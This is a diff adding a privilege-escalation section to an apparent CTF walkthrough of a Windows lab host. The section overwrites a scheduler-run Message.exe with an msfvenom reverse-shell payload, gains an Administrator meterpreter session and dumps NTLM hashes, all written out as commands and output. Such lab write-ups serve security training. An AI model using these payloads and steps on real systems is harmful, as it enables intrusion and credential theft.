@@ -285,6 +285,238 @@ c:\windows\temp>.\winPEAS.exe
     WSService: Start, WriteData/CreateFiles, TakeOwnership
 ```
 
-In addition to a ton of information about the host, there appears to be an administrator set of credentials, as well as a service (WScheduler) that is locally modifiable, restartable and running as an administrative user. Since this appeared to be the intended attack vector, I decided to attack this further.
+In addition to a ton of information about the host, there appears to be an administrator set of credentials, as well as a service (WScheduler) that is locally modifiable and running as an administrative user. Since this appeared to be the intended attack vector, I decided to attack this further.
+
+### Attacking WScheduler
+I started by taking a look at the `WScheduler` service 
+```
+meterpreter > cd PrograProgram Files  "Program Files (x86)" 
+meterpreter > cd SystemScheduler 
+meterpreter > ls
+Listing: c:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   4096     dir   2019-08-04 11:36:53 +0000  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 11:36:42 +0000  Forum.url
+100666/rw-rw-rw-  9813     fil   2019-08-04 11:36:42 +0000  License.txt
+100666/rw-rw-rw-  1496     fil   2019-08-04 11:37:02 +0000  LogFile.txt
+100666/rw-rw-rw-  3760     fil   2019-08-04 11:36:53 +0000  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2019-08-04 11:36:42 +0000  Message.exe
+100777/rwxrwxrwx  445344   fil   2019-08-04 11:36:42 +0000  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2019-08-04 11:36:42 +0000  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 11:36:53 +0000  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2019-08-04 11:36:42 +0000  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2019-08-04 11:36:42 +0000  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2019-08-04 11:36:42 +0000  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2019-08-04 11:36:42 +0000  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2019-08-04 11:36:42 +0000  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2019-08-04 11:36:42 +0000  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2019-08-04 11:36:42 +0000  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2019-08-04 11:36:42 +0000  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2019-08-04 11:36:42 +0000  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2019-08-04 11:36:42 +0000  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2019-08-04 11:36:42 +0000  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2019-08-04 11:36:42 +0000  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2019-08-04 11:36:42 +0000  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2019-08-04 11:36:42 +0000  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2019-08-04 11:36:42 +0000  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2019-08-04 11:36:42 +0000  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2019-08-04 11:36:42 +0000  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 11:36:42 +0000  Website.url
+100777/rwxrwxrwx  76704    fil   2019-08-04 11:36:42 +0000  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2019-08-04 11:36:42 +0000  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  clock.ico
+100666/rw-rw-rw-  80856    fil   2019-08-04 11:36:42 +0000  ding.wav
+100666/rw-rw-rw-  1637972  fil   2019-08-04 11:36:42 +0000  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2019-08-04 11:36:42 +0000  sc32.exe
+100666/rw-rw-rw-  766      fil   2019-08-04 11:36:42 +0000  schedule.ico
+100666/rw-rw-rw-  355446   fil   2019-08-04 11:36:42 +0000  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 11:36:42 +0000  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 11:36:42 +0000  unins000.exe
+100666/rw-rw-rw-  6574     fil   2019-08-04 11:36:42 +0000  whiteclock.ico
+```
+
+Once in the directory, I started trying to figure out what the service did as there were a ton of executable files that could be potential vectors. The most obvious seemed to be `WService` however I currently wasn't able to restart the service so I wasn't yet sure how I would exploit `WService`.
+
+```
+c:\Program Files (x86)\SystemScheduler>sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WindowsScheduler
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+I took a look at `LogFile.txt` which lead me to believe it didn't restart frequently on its own.
+
+```
+meterpreter > cat LogFile.txt
+08/04/19 04:37:02,Starting System Scheduler SERVICE (SYSTEM)
+08/04/19 11:47:18,Starting System Scheduler SERVICE (SYSTEM)
+08/04/19 15:03:47,Starting System Scheduler SERVICE (SYSTEM)
+08/04/19 16:42:54,Starting System Scheduler SERVICE (SYSTEM)
+08/04/19 16:47:29,Stopping System Scheduler SERVICE. (SYSTEM)
+08/04/19 16:47:37,Starting System Scheduler SERVICE (SYSTEM)
+08/04/19 17:59:37,Starting System Scheduler SERVICE (SYSTEM)
+08/04/19 18:04:10,Stopping System Scheduler SERVICE. (SYSTEM)
+
+08/05/19 14:03:43,Starting System Scheduler SERVICE (SYSTEM)
+08/06/19 14:11:27,Starting System Scheduler SERVICE (SYSTEM)
+08/06/19 14:16:26,Stopping System Scheduler SERVICE. (SYSTEM)
+10/02/20 14:12:16,Starting System Scheduler SERVICE (SYSTEM)
+10/02/20 14:30:29,Stopping System Scheduler SERVICE. (SYSTEM)
+10/02/20 14:31:29,Starting System Scheduler SERVICE (SYSTEM)
+10/02/20 14:48:55,Stopping System Scheduler SERVICE. (SYSTEM)
+10/02/20 14:50:01,Starting System Scheduler SERVICE (SYSTEM)
+10/02/20 15:03:23,Stopping System Scheduler SERVICE. (SYSTEM)
+10/02/20 15:04:22,Starting System Scheduler SERVICE (SYSTEM)
+10/02/20 15:05:49,Stopping System Scheduler SERVICE. (SYSTEM)
+10/02/20 15:06:49,Starting System Scheduler SERVICE (SYSTEM)
+10/02/20 15:10:59,Stopping System Scheduler SERVICE. (SYSTEM)
+11/18/20 14:11:57,Starting System Scheduler SERVICE (SYSTEM)
+```
+
+I then looked under the `Events` directory where I found a log file that indicated the `Message.exe` binary was executed approximately every 30 seconds as the administrative user. This binary was overwritable and appeared to be a perfect vector to attack for an administrative user.
+
+```
+meterpreter > cd Events 
+meterpreter > ls
+Listing: c:\Program Files (x86)\SystemScheduler\Events
+======================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  1926   fil   2019-08-04 22:05:19 +0000  20198415519.INI
+100666/rw-rw-rw-  24441  fil   2019-08-04 22:06:01 +0000  20198415519.INI_LOG.txt
+100666/rw-rw-rw-  290    fil   2020-10-02 21:50:12 +0000  2020102145012.INI
+100666/rw-rw-rw-  186    fil   2020-11-18 22:12:31 +0000  Administrator.flg
+100666/rw-rw-rw-  182    fil   2020-11-18 22:11:57 +0000  SYSTEM_svc.flg
+100666/rw-rw-rw-  0      fil   2020-11-18 22:12:31 +0000  Scheduler.flg
+100666/rw-rw-rw-  449    fil   2019-08-04 11:36:53 +0000  SessionInfo.flg
+100666/rw-rw-rw-  0      fil   2020-11-18 22:11:57 +0000  service.flg
+
+meterpreter > cat 20198415519.INI_LOG.txt
+...
+11/18/20 14:58:00,Event Started Ok, (Administrator)
+11/18/20 14:58:33,Process Ended. PID:1976,ExitCode:4,Message.exe (Administrator)
+11/18/20 14:59:01,Event Started Ok, (Administrator)
+11/18/20 14:59:34,Process Ended. PID:2820,ExitCode:4,Message.exe (Administrator)
+11/18/20 15:00:01,Event Started Ok, (Administrator)
+11/18/20 15:00:33,Process Ended. PID:980,ExitCode:4,Message.exe (Administrator)
+11/18/20 15:01:01,Event Started Ok, (Administrator)
+11/18/20 15:01:33,Process Ended. PID:1340,ExitCode:4,Message.exe (Administrator)
+11/18/20 15:02:01,Event Started Ok, (Administrator)
+```
+
+I generated a new binary called Message.exe that pointed at port 4443, started a second listener on this port
+
+```                                                   
+root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.7.59 LPORT=4443 -f exe -o Message.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload                                                                                                            
+No encoder specified, outputting raw payload                                                                                                                          
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: Message.exe%
+```
+
+```
+meterpreter > cd ../
+meterpreter > upload /root/ctf/transfer/Message.exe 
+[*] uploading  : /root/ctf/transfer/Message.exe -> Message.exe
+[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/ctf/transfer/Message.exe -> Message.exe
+[*] uploaded   : /root/ctf/transfer/Message.exe -> Message.exe
+meterpreter > 
+[*] Sending stage (176195 bytes) to 10.10.167.66
+[*] Meterpreter session 2 opened (10.10.7.59:4443 -> 10.10.167.66:49273) at 2020-11-18 23:09:00 +0000
+
+meterpreter > backgoround 
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  IIS APPPOOL\Blog @ HACKPARK        10.10.7.59:4444 -> 10.10.167.66:49250 (10.10.167.66)
+  2         meterpreter x86/windows  HACKPARK\Administrator @ HACKPARK  10.10.7.59:4443 -> 10.10.167.66:49273 (10.10.167.66)
+
+msf5 exploit(multi/handler) > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter > getpid
+Current pid: 1260
+meterpreter > getuid
+Server username: HACKPARK\Administrator
+```
+
+Success! I had an administrative account. I decided to move the session to a stabler process than the one i currently had, with the print spooler being my default first choice.
+
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 368   4     smss.exe              x64   0                                      
+ 520   512   csrss.exe             x64   0                                      
+ 580   568   csrss.exe             x64   1                                      
+ 588   512   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
+ 616   568   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 672   588   services.exe          x64   0                                      
+ 740   672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 784   672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 820   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 868   616   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
+ 876   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 904   672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 964   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1020  672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1156  672   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1216  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1236  672   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1292  672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1356  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1372  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1388  672   WService.exe          x86   0        NT AUTHORITY\SYSTEM           C:\PROGRA~2\SYSTEM~1\WService.exe
+ 1548  1388  WScheduler.exe        x86   0        NT AUTHORITY\SYSTEM           C:\PROGRA~2\SYSTEM~1\WScheduler.exe
+ 1652  672   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1740  740   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
+ 1756  672   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1988  672   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+ 2412  1200  WScheduler.exe        x86   1        HACKPARK\Administrator        C:\Program Files (x86)\SystemScheduler\WScheduler.exe
+ 2536  2412  Message.exe           x86   1        HACKPARK\Administrator        C:\PROGRA~2\SYSTEM~1\Message.exe
+ 2588  904   taskhostex.exe        x64   1        HACKPARK\Administrator        C:\Windows\System32\taskhostex.exe
+ 2664  2656  explorer.exe          x64   1        HACKPARK\Administrator        C:\Windows\explorer.exe
+ 3064  2612  ServerManager.exe     x64   1        HACKPARK\Administrator        C:\Windows\System32\ServerManager.exe
+
+meterpreter > migrate 1756
+[*] Migration completed successfully.
+```
+
+Finally I dumped the credential hashes for a fun flag.
+
+```
+meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3352c0731470aabf133e0c84276adcba:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jeff:1001:aad3b435b51404eeaad3b435b51404ee:e7dd0bd78b1d5d7eea4ee746816e2377:::
+```
 
 ## Summary
+This host was interesting solely due to the potential that Scheduler service provided. By functioning like cron I was able to trigger a connection attempt at a 30second interval giving me persistence for as long as that job was running the same binary. One thing I could have tried to do further was leverage templating in msfvenom to persist the binary with a backdoor added. All in all this was a fun way for me to continue experimenting with windows hosts.
